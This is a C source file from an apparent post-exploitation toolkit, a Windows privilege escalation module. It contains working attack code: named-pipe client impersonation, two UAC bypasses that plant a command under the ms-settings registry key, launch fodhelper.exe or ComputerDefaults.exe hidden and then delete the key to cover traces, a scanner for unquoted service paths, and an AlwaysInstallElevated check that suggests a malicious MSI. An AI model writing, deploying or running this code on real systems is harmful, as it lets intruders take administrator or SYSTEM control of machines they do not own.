/**
 * privesc.c - Privilege Escalation Module
 *
 * Implements privilege escalation techniques:
 * - Token manipulation (SeImpersonatePrivilege abuse)
 * - Named pipe impersonation
 * - UAC bypass methods
 * - Unquoted service paths
 * - DLL hijacking in writable service paths
 * - AlwaysInstallElevated
 */

#include <windows.h>
#include <aclapi.h>
#include <sddl.h>
#include <stdio.h>
#include "../../include/postex.h"

#pragma comment(lib, "advapi32.lib")

/* ---- Token Privilege Escalation ---- */
int privesc_enable_privilege(HANDLE token, const char* privilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValueA(NULL, privilege, &luid)) {
        return -1;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        return -1;
    }

    return (GetLastError() == ERROR_NOT_ALL_ASSIGNED) ? -1 : 0;
}

/* ---- Check Current Privileges ---- */
int privesc_check_privileges(char* output, int output_sz) {
    HANDLE token;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        snprintf(output, output_sz, "Cannot open process token: %lu", GetLastError());
        return -1;
    }

    DWORD size = 0;
    GetTokenInformation(token, TokenPrivileges, NULL, 0, &size);
    TOKEN_PRIVILEGES* tp = (TOKEN_PRIVILEGES*)malloc(size);
    if (!tp) { CloseHandle(token); return -1; }

    GetTokenInformation(token, TokenPrivileges, tp, size, &size);

    int offset = 0;
    offset += snprintf(output + offset, output_sz - offset, "Privileges (%lu):\n", tp->PrivilegeCount);

    for (DWORD i = 0; i < tp->PrivilegeCount && offset < output_sz - 128; i++) {
        char name[256] = {0};
        DWORD name_sz = sizeof(name);
        LookupPrivilegeNameA(NULL, &tp->Privileges[i].Luid, name, &name_sz);

        const char* status = (tp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) ? "Enabled" : "Disabled";
        offset += snprintf(output + offset, output_sz - offset, "  %s [%s]\n", name, status);
    }

    // Flag exploitable privileges
    const char* exploitable[] = {
        "SeImpersonatePrivilege",
        "SeAssignPrimaryTokenPrivilege",
        "SeTcbPrivilege",
        "SeBackupPrivilege",
        "SeRestorePrivilege",
        "SeCreateTokenPrivilege",
        "SeLoadDriverPrivilege",
        "SeTakeOwnershipPrivilege",
        "SeDebugPrivilege",
    };

    offset += snprintf(output + offset, output_sz - offset, "\nExploitable:\n");
    for (DWORD i = 0; i < tp->PrivilegeCount; i++) {
        char name[256] = {0};
        DWORD name_sz = sizeof(name);
        LookupPrivilegeNameA(NULL, &tp->Privileges[i].Luid, name, &name_sz);

        for (int j = 0; j < 9; j++) {
            if (strcmp(name, exploitable[j]) == 0 &&
                (tp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)) {
                offset += snprintf(output + offset, output_sz - offset,
                    "  [!] %s - EXPLOITABLE\n", name);
            }
        }
    }

    free(tp);
    CloseHandle(token);
    return 0;
}

/* ---- Named Pipe Impersonation (Potato-style) ---- */
int privesc_pipe_impersonate(const char* pipe_name, char* output, int output_sz) {
    char full_pipe[256];
    snprintf(full_pipe, sizeof(full_pipe), "\\\\.\\pipe\\%s", pipe_name);

    wchar_t wpipe[256];
    MultiByteToWideChar(CP_ACP, 0, full_pipe, -1, wpipe, 256);

    // Create named pipe
    HANDLE pipe = CreateNamedPipeW(wpipe,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1, 4096, 4096, 0, NULL);

    if (pipe == INVALID_HANDLE_VALUE) {
        snprintf(output, output_sz, "CreateNamedPipe failed: %lu", GetLastError());
        return -1;
    }

    snprintf(output, output_sz, "Pipe created: %s - waiting for connection...", full_pipe);

    // Wait for connection (would need a trigger)
    if (ConnectNamedPipe(pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
        // Impersonate the connected client
        if (ImpersonateNamedPipeClient(pipe)) {
            // Get impersonated token info
            HANDLE token;
            if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &token)) {
                // Check who we are now
                DWORD size = 0;
                GetTokenInformation(token, TokenUser, NULL, 0, &size);
                TOKEN_USER* user = (TOKEN_USER*)malloc(size);
                if (user && GetTokenInformation(token, TokenUser, user, size, &size)) {
                    char* sid_str = NULL;
                    ConvertSidToStringSidA(user->User.Sid, &sid_str);
                    snprintf(output, output_sz, "Impersonated: %s", sid_str ? sid_str : "unknown");
                    if (sid_str) LocalFree(sid_str);
                }
                free(user);
                CloseHandle(token);
            }
            RevertToSelf();
        }
    }

    CloseHandle(pipe);
    return 0;
}

/* ---- UAC Bypass: fodhelper ---- */
int privesc_uac_fodhelper(const char* command) {
    HKEY hkey;
    const char* subkey = "Software\\Classes\\ms-settings\\Shell\\Open\\command";

    // Create registry key for fodhelper bypass
    LONG status = RegCreateKeyExA(HKEY_CURRENT_USER, subkey, 0, NULL,
                                   REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                                   NULL, &hkey, NULL);
    if (status != ERROR_SUCCESS) return -1;

    // Set default value to our command
    RegSetValueExA(hkey, NULL, 0, REG_SZ, (BYTE*)command, (DWORD)strlen(command) + 1);

    // Set DelegateExecute to empty (required for bypass)
    RegSetValueExA(hkey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
    RegCloseKey(hkey);

    // Launch fodhelper.exe (auto-elevates)
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    CreateProcessA(NULL, "C:\\Windows\\System32\\fodhelper.exe",
                   NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    if (pi.hProcess) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    // Cleanup registry
    RegDeleteKeyA(HKEY_CURRENT_USER, subkey);
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");

    return 0;
}

/* ---- UAC Bypass: computerdefaults ---- */
int privesc_uac_computerdefaults(const char* command) {
    HKEY hkey;
    const char* subkey = "Software\\Classes\\ms-settings\\Shell\\Open\\command";

    LONG status = RegCreateKeyExA(HKEY_CURRENT_USER, subkey, 0, NULL,
                                   REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                                   NULL, &hkey, NULL);
    if (status != ERROR_SUCCESS) return -1;

    RegSetValueExA(hkey, NULL, 0, REG_SZ, (BYTE*)command, (DWORD)strlen(command) + 1);
    RegSetValueExA(hkey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
    RegCloseKey(hkey);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    CreateProcessA(NULL, "C:\\Windows\\System32\\ComputerDefaults.exe",
                   NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    if (pi.hProcess) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    // Cleanup
    RegDeleteKeyA(HKEY_CURRENT_USER, subkey);
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");

    return 0;
}

/* ---- Unquoted Service Path Finder ---- */
int privesc_find_unquoted_paths(char* output, int output_sz) {
    SC_HANDLE sc_mgr = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!sc_mgr) return -1;

    DWORD bytes_needed = 0, services_returned = 0, resume_handle = 0;
    EnumServicesStatusExA(sc_mgr, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
                          SERVICE_STATE_ALL, NULL, 0, &bytes_needed,
                          &services_returned, &resume_handle, NULL);

    BYTE* buf = (BYTE*)malloc(bytes_needed);
    if (!buf) { CloseServiceHandle(sc_mgr); return -1; }

    EnumServicesStatusExA(sc_mgr, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
                          SERVICE_STATE_ALL, buf, bytes_needed, &bytes_needed,
                          &services_returned, &resume_handle, NULL);

    ENUM_SERVICE_STATUS_PROCESSA* services = (ENUM_SERVICE_STATUS_PROCESSA*)buf;
    int offset = 0;
    offset += snprintf(output + offset, output_sz - offset, "Unquoted Service Paths:\n");

    for (DWORD i = 0; i < services_returned && offset < output_sz - 512; i++) {
        SC_HANDLE svc = OpenServiceA(sc_mgr, services[i].lpServiceName, SERVICE_QUERY_CONFIG);
        if (!svc) continue;

        DWORD cfg_size = 0;
        QueryServiceConfigA(svc, NULL, 0, &cfg_size);
        QUERY_SERVICE_CONFIGA* cfg = (QUERY_SERVICE_CONFIGA*)malloc(cfg_size);
        if (cfg && QueryServiceConfigA(svc, cfg, cfg_size, &cfg_size)) {
            // Check if path contains spaces and is not quoted
            if (cfg->lpBinaryPathName &&
                strchr(cfg->lpBinaryPathName, ' ') &&
                cfg->lpBinaryPathName[0] != '"') {
                offset += snprintf(output + offset, output_sz - offset,
                    "  [!] %s: %s\n", services[i].lpServiceName, cfg->lpBinaryPathName);
            }
        }
        free(cfg);
        CloseServiceHandle(svc);
    }

    free(buf);
    CloseServiceHandle(sc_mgr);
    return 0;
}

/* ---- AlwaysInstallElevated Check ---- */
int privesc_check_always_install_elevated(char* output, int output_sz) {
    DWORD value = 0, size = sizeof(DWORD);
    HKEY hkey;
    int hklm_set = 0, hkcu_set = 0;

    // Check HKLM
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
        0, KEY_READ, &hkey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hkey, "AlwaysInstallElevated", NULL, NULL,
            (BYTE*)&value, &size) == ERROR_SUCCESS) {
            hklm_set = (value == 1);
        }
        RegCloseKey(hkey);
    }

    // Check HKCU
    value = 0;
    size = sizeof(DWORD);
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
        0, KEY_READ, &hkey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hkey, "AlwaysInstallElevated", NULL, NULL,
            (BYTE*)&value, &size) == ERROR_SUCCESS) {
            hkcu_set = (value == 1);
        }
        RegCloseKey(hkey);
    }

    if (hklm_set && hkcu_set) {
        snprintf(output, output_sz,
            "[!] AlwaysInstallElevated is ENABLED in both HKLM and HKCU!\n"
            "    Exploit: Generate malicious MSI and install with msiexec");
        return 1;  // Vulnerable
    }

    snprintf(output, output_sz, "AlwaysInstallElevated: Not exploitable (HKLM=%d, HKCU=%d)",
             hklm_set, hkcu_set);
    return 0;
}
